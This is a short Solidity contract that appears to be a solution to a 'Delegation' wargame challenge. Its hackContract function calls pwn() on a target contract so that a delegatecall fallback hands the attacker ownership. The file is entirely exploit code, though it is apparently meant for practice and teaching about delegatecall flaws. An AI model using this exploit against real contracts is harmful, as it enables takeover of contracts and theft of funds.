// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegate public delegate;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
      (bool _success,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
      require(_success);
    }
}
